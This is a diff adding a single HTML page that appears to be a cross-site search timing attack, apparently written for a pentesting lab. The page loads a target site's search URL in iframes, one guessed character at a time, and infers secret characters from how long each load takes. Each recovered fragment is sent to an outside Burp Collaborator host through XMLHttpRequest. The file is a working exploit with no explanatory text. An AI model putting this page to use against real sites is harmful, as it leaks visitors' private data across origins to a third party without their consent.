@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <ul id="secrets"></ul>
+
+<script>
+    function sendKey(k)
+    {
+        console.log("sendKey:"+k)
+        try {
+            x = new XMLHttpRequest();
+            x.open("GET","http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k, false);
+            x.send();
+        } catch(e) {
+                console.log("BB"+e);
+        }
+    };
+    
+    var chars="0123456789-abcdef";
+
+    function timeLoad(url, key, i)
+    {
+        var iframe = document.createElement('iframe');
+        iframe.src = url+key+chars.charAt(i);
+        document.body.appendChild(iframe);
+
+        // Measure the time before the request was initiated
+        var start = performance.now();
+
+        iframe.onload = () => {
+            // When iframe loads, calculate the time difference
+            var time = performance.now() - start;
+            console.log("The iframe and subresources took %d ms to load.", time)
+            if (time > 3300) {
+                key += chars.charAt(i)
+                sendKey("rt:"+time+" INT:"+key)
+                if (key.length < 3) {
+                    console.log("nextkey")
+                    timeLoad(url, key, 0)
+                }
+            } else {
+                if (i+1<chars.length) {
+                    console.log("nextchar")
+                    timeLoad(url, key, i+1)
+                }
+            }          
+        }
+    }
+
+sendKey("Started")
+timeLoad("http://ptl-ff8dcea2-d4247c35.libcurl.so/search?search=%5e", "", 0)
+
+</script>
+  </body>
+</html>
